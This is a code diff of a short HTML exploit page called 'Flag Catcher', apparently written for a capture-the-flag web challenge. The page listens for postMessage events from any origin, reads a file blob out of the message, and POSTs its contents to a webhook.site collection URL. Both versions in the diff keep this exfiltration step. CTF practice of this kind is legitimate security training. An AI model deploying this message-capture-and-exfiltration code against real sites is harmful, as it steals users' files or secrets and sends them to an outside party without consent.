@@ -1,38 +1,28 @@
 <!DOCTYPE html>
 <html>
-<head>
-  <title>Flag Catcher</title>
-</head>
-<body>
-  <h1>Waiting for the flag...</h1>
+  <head><title>Flag Catcher</title></head>
+  <body>
+    <h1>Waiting for flag...</h1>
+    <script>
+      console.log("[*] Listening for postMessage");
 
-  <script>
-    console.log("[*] Exploit page loaded. Listening for messages.");
+      window.addEventListener("message", async (event) => {
+        console.log("[*] Got message:", event.data);
 
-    window.addEventListener("message", async (event) => {
-      console.log("[*] Received message:", event.data);
+        const file = event.data?.files?.[0];
+        if (!file?.blob) return console.warn("No blob found");
 
-      const file = event.data?.files?.[0];
-      if (!file?.blob) {
-        console.warn("No blob found in message.");
-        return;
-      }
-
-      try {
         const text = await new Blob([file.blob]).text();
-        console.log("[+] Extracted flag:", text);
+        console.log("[+] Flag extracted:", text);
 
         await fetch("http://webhook.site/3479a7fe-2390-4039-a92c-9ee26bc2c2fb", {
           method: "POST",
           headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({ flag: text, timestamp: new Date().toISOString() })
+          body: JSON.stringify({ flag: text })
         });
 
-        console.log("[+] Flag sent to webhook.");
-      } catch (e) {
-        console.error("[!] Error reading blob:", e);
-      }
-    });
-  </script>
-</body>
+        console.log("[+] Sent to webhook");
+      });
+    </script>
+  </body>
 </html>
